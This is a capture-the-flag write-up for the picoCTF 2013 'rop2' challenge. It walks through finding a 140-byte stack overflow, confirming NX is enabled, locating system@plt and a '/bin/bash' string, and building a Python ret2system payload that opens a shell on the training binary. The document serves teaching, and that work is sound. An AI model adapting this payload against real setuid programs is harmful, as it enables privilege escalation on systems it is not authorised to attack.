### S0lv3d by H4yicl3

First i download source here :https://2013.picoctf.com/problems/rop2-20f65dd0bcbe267d
then i use IDA to analysis the code
```c
int be_nice_to_people()			//<----function make us have permission run of suid
{
  __gid_t v0; // ST1C_4@1

  v0 = getegid();							// /bin/sh is usually symlinked to bash, which usually drops privs. Make
											// sure we don't drop privs if we exec bash, (ie if we call system()).
  return setresgid(v0, v0, v0);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  be_nice_to_people();
  vulnerable_function();
  return write(1, "Hello, World\n", 0xDu);
}
ssize_t vulnerable_function()	
{
  char buf; // [sp+10h] [bp-88h]@1	//<----- overflow this 

  return read(0, &buf, 0x100u);
}
```

the second we need to find eip(return address)
```
-00000088 buf             db ?
+00000004  r              db 4 dup(?)
```
So the offset = 0x88+0x4 =0x8c(hex) = 140

the third we use gdb-peda to checksec
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED				<----- the flag NX turned on
PIE       : disabled
RELRO     : Partial
gdb-peda$ 
```

So we can't excute in stack 
the rop2 look like rop1 so we need find the other function 
we found that
```c
.text:080484A4                 public not_called
.text:080484A4 not_called      proc near
.text:080484A4                 push    ebp
.text:080484A5                 mov     ebp, esp
.text:080484A7                 sub     esp, 18h
.text:080484AA                 mov     dword ptr [esp], offset command ; "/bin/date"	<---- not /bin/bash
.text:080484B1                 call    _system								<---- we need call here
.text:080484B6                 leave
.text:080484B7                 retn
.text:080484B7 not_called      endp
```

but the system@plt not call _system
```
objdump -d rop2-20f65dd0bcbe267d | grep system
...
080483a0 <system@plt>:
or use IDA

.plt:080483A0 ; int system(const char *command)
.plt:080483A0 _system         proc near               ; CODE XREF: not_called+Dp
.plt:080483A0                 jmp     ds:off_804A008
```

Now we have address system : 080483a0 <system@plt>:

so we need to find /bin/bash i use gdb-peda to do it:

```
gdb-peda$ b *main
gdb-peda$ r
gdb-peda$ find /bin/bash
Searching for '/bin/bash' in: None ranges
Found 3 results, display max 3 items:
   rop2 : 0x8048610 ("/bin/bash")				<----- the address doesn't random
   rop2 : 0x8049610 ("/bin/bash")				
[stack] : 0xffffd8b2 ("/bin/bash")				<----- the address of libc -> random
gdb-peda$ 
```

So we need to excute system("/bin/bash")
address of system of function not_called
-->system_address = 0x080483A0
-->binbash_address = 0x8049610
finaly, we write the python script look like:
```python
padding = "A"*140
system_address = "\xa0\x83\x04\x08"
return_after_system = "junk"
binbash_address = "\x10\x96\x04\x08"
print padding + system_address + return_after_system + binbash_address
```

try to run it
```
(python rop2.py;cat)|./rop2 
whoami
hayicle
```

well done!!